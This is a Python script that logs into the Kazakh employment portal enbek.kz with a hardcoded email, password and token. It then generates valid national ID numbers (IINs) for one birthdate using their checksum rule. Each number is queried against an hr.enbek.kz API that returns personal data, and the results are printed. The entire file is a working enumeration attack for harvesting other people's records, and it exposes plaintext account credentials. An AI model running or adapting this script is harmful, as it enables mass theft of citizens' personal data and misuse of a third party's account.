import requests
import asyncio

url = 'https://passport.enbek.kz/ru/user/login'
user_agent_val = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36'
session = requests.Session()
r = session.get(url, headers = {
    'User-Agent': user_agent_val
})

session.headers.update({'Referer':url})
session.headers.update({'User-Agent':user_agent_val})
post_request = session.post(url, {  
     '_token' : 'LMN2lxKRIsEw96R6BJaKfuEfRn8W9JKriFCJQcrA',
     'auth_type': 'email',
     'email': 'b.iliyas.2005@gmail.com',
     'password': 'Iliyas2005@',
})

for year in range(2005, 2006):
    for month in range(12, 13):
        for day in range(5, 6):
            iin = str(year).replace(str(year)[0] + str(year)[1],"") + str(month).zfill(2) + str(day).zfill(2) + '5'
            indexStart = int(input("Start index : "))
            indexEnd = int(input("End index : "))
            for i in range(indexStart,indexEnd):
                iinCopy = iin
                iinCopy = iinCopy + str(i).zfill(4)
                v = []
                for j in range(0, len(iinCopy)):
                    v.append(int(iinCopy[j]))
                is_actual = False
                n12 = (1*v[0] + 2*v[1] + 3*v[2] + 4*v[3] + 5*v[4] + 6*v[5] + 7*v[6] + 8*v[7] + 9*v[8] + 10*v[9] + 11*v[10]) % 11
                    
                if n12 == 10:
                    n12 = (3*v[0] + 4*v[1] + 5*v[2] + 6*v[3] + 7*v[4] + 8*v[5] + 9*v[6] + 10*v[7] + 11*v[8] + 1*v[9] + 2*v[10]) % 11
                    if n12 != 10:
                        is_actual = True
                else:
                    is_actual = True
                if(is_actual):
                    v.append(n12)
                    iinCopy = ''.join(str(i) for i in v)
                    print(iinCopy)
                    getIin = session.get('https://hr.enbek.kz/api/contract/universalMethods/requestFlData?iin='+iinCopy)
                    print(getIin.text)
                    print()



    